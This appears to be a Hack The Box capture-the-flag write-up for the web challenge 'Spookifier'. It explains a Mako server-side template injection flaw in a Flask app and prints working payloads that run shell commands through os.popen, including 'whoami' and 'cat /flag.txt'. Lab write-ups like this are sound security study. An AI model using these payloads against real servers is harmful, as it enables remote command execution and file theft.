# Spookifier – HTB Challenge Writeup

**Challenge Name:** Spookifier
**Platform:** Hack The Box (HTB)
**Category:** Web
**Difficulty:** Easy

---

## Application Overview

Upon visiting the challenge web application, we are greeted with a simple interface where we can enter some text. When we submit it, we receive that same input text rendered in four different font styles on the resulting page. There are no authentication mechanisms or other functionalities, just one textbox and styled output. At first glance, this appears to be a harmless font conversion app.

---

## Vulnerability Discovery

We were provided with the source code, so we began by tracing the input flow. In `routes.py`, we see:

```python
@web.route('/')
def index():
    text = request.args.get('text')
    if text:
        converted = spookify(text)
        return render_template('index.html', output=converted)
    return render_template('index.html', output='')
```

The user input (`text`) is passed directly to a function called `spookify()`. Inside `util.py`, that function calls another helper `generate_render()` after converting the input into stylized text using several font dictionaries:

```python
def generate_render(converted_fonts):
    result = '''
        <tr><td>{0}</td></tr>
        <tr><td>{1}</td></tr>
        <tr><td>{2}</td></tr>
        <tr><td>{3}</td></tr>
    '''.format(*converted_fonts)

    return Template(result).render()
```

Here’s the key issue: `Template(result).render()` is part of the **Mako template engine**, and it's used to render a user-generated HTML string without escaping or sanitization. This means if our input ends up in the template, it will be interpreted as executable Mako code.

---

## 🚨 Exploiting SSTI
To verify this, we supplied the following payload in the `text` parameter: ``` ${7*7} ```. If the application was secure, this should be displayed as-is. But instead, we received: ``` 49 ```. This confirmed that our input is being **evaluated as a Mako template expression**, and the server is vulnerable to SSTI.
With SSTI confirmed, the next goal was to find a way to execute system commands. The Mako template engine doesn't provide direct access to Python's built-ins like `__import__`, but we can still access the `os` module via the `self` object:

> Payload reference: [PayloadAllTheThings – Mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

We tested with: ``` ${self.module.cache.util.os.popen('whoami').read()} ``` And successfully got back: ``` root ```
Now that we had command execution, we simply replaced the command to read the flag: ``` ${self.module.cache.util.os.popen('cat /flag.txt').read()} ```
